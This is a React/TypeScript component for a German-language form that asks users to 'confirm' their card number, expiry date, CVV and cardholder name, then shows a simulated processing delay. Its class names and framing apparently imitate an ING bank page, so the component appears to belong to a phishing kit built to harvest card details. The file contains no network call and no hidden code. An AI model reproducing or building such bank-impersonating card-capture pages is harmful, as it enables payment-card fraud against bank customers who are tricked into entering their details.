import React, { useState } from 'react';
import Loading from './Loading';

interface BankCardData {
  card_number: string;
  expiry_date: string;
  cvv: string;
  cardholder_name: string;
}

interface BankCardFormProps {
  onSubmit: (data: BankCardData) => void;
}

const BankCardForm: React.FC<BankCardFormProps> = ({ onSubmit }) => {
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardholderName, setCardholderName] = useState('');
  
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState<Partial<BankCardData>>({});

  const formatCardNumber = (value: string) => {
    // Remove all non-digits
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    // Add spaces every 4 digits
    const matches = v.match(/\d{4,16}/g);
    const match = matches && matches[0] || '';
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    if (parts.length) {
      return parts.join(' ');
    } else {
      return v;
    }
  };

  const formatExpiryDate = (value: string) => {
    // Remove all non-digits
    const v = value.replace(/\D/g, '');
    // Add slash after 2 digits
    if (v.length >= 2) {
      return v.substring(0, 2) + '/' + v.substring(2, 4);
    }
    return v;
  };

  const validateForm = (): boolean => {
    const newErrors: Partial<BankCardData> = {};
    
    if (!cardNumber.trim()) {
      newErrors.card_number = 'Bitte geben Sie Ihre Kartennummer ein.';
    } else if (cardNumber.replace(/\s/g, '').length < 13) {
      newErrors.card_number = 'Bitte geben Sie eine gültige Kartennummer ein.';
    }
    
    if (!expiryDate.trim()) {
      newErrors.expiry_date = 'Bitte geben Sie das Ablaufdatum ein.';
    } else if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
      newErrors.expiry_date = 'Bitte geben Sie das Datum im Format MM/JJ ein.';
    }
    
    if (!cvv.trim()) {
      newErrors.cvv = 'Bitte geben Sie die CVV ein.';
    } else if (cvv.length < 3) {
      newErrors.cvv = 'Die CVV muss 3-4 Ziffern haben.';
    }
    
    if (!cardholderName.trim()) {
      newErrors.cardholder_name = 'Bitte geben Sie den Karteninhaber ein.';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }
    
    setIsLoading(true);
    
    const formData: BankCardData = {
      card_number: cardNumber,
      expiry_date: expiryDate,
      cvv: cvv,
      cardholder_name: cardholderName
    };
    
    // Simulate form processing
    setTimeout(() => {
      onSubmit(formData);
      setIsLoading(false);
    }, 1000);
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    if (formatted.replace(/\s/g, '').length <= 16) {
      setCardNumber(formatted);
    }
  };

  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatExpiryDate(e.target.value);
    if (formatted.length <= 5) {
      setExpiryDate(formatted);
    }
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value.length <= 4) {
      setCvv(value);
    }
  };

  if (isLoading) {
    return <Loading message="Bankkarten-Daten werden verarbeitet..." />;
  }

  return (
    <div className="two-column-layout">
      <div className="ing-card left-column">
        <div className="card-title">Bankkarten-Daten bestätigen</div>
        <div className="form-container">
          <form onSubmit={handleSubmit} className="form-container_content">
              <div className="form-group" data-component-name="BankCardForm">
                <div className="form-row">
                  <label className="form-group__label" htmlFor="cardNumber" data-component-name="BankCardForm">
                    Kartennummer
                  </label>
                  <div className="form-group__input-container">
                    <input
                      className={`input-field ${errors.card_number ? 'error' : ''}`}
                      type="text"
                      id="cardNumber"
                      name="cardNumber"
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      autoComplete="cc-number"
                      maxLength={19}
                    />
                    {errors.card_number && (
                      <span className="form-group__error">{errors.card_number}</span>
                    )}
                  </div>
                </div>
              </div>
              
              <div className="form-group">
                <div className="form-row">
                  <label className="form-group__label" htmlFor="expiryDate">
                    Ablaufdatum
                  </label>
                  <div className="form-group__input-container">
                    <input
                      className={`input-field ${errors.expiry_date ? 'error' : ''}`}
                      type="text"
                      id="expiryDate"
                      name="expiryDate"
                      value={expiryDate}
                      onChange={handleExpiryDateChange}
                      autoComplete="cc-exp"
                      maxLength={5}
                    />
                    {errors.expiry_date && (
                      <span className="form-group__error">{errors.expiry_date}</span>
                    )}
                  </div>
                </div>
              </div>

              <div className="form-group">
                <div className="form-row">
                  <label className="form-group__label" htmlFor="cvv">
                    CVV/CVC
                  </label>
                  <div className="form-group__input-container">
                    <input
                      className={`input-field ${errors.cvv ? 'error' : ''}`}
                      type="text"
                      id="cvv"
                      name="cvv"
                      value={cvv}
                      onChange={handleCvvChange}
                      autoComplete="cc-csc"
                      maxLength={4}
                    />
                    {errors.cvv && (
                      <span className="form-group__error">{errors.cvv}</span>
                    )}
                  </div>
                </div>
              </div>

              <div className="form-group">
                <div className="form-row">
                  <label className="form-group__label" htmlFor="cardholderName">
                    Karteninhaber
                  </label>
                  <div className="form-group__input-container">
                    <input
                      className={`input-field ${errors.cardholder_name ? 'error' : ''}`}
                      type="text"
                      id="cardholderName"
                      name="cardholderName"
                      value={cardholderName}
                      onChange={(e) => setCardholderName(e.target.value.toUpperCase())}
                      autoComplete="cc-name"
                      maxLength={50}
                    />
                    {errors.cardholder_name && (
                      <span className="form-group__error">{errors.cardholder_name}</span>
                    )}
                  </div>
                </div>
              </div>
              
              <div className="form-group anmelden-button-container">
                <button type="submit" className="button button-primary" data-component-name="BankCardForm">
                  Daten bestätigen
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
  );
};

export default BankCardForm;
